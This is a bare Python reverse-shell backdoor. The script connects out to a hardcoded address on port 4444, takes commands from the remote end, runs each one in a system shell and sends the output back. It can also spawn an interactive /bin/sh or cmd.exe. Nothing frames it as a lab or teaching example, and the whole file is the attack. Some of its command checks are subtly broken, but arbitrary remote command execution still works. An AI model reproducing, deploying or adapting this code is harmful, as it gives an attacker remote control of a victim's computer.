import socket 
import subprocess
import pty
import platform

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect(("0.0.0.0", 4444))

except:
    exit(0)


while True:
    cmd = sock.recv(1024)

    if cmd == "finish" or cmd == "exit":
        sock.close()
        exit(0)

    elif cmd == "shell":
        if platform.system() == "Linux":
            pty.spawn("/bin/sh")

        else:
            subprocess.call("cmd.exe")

    else:
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        send = proc.stdout.read() + proc.stderr.read()

        sock.send(send)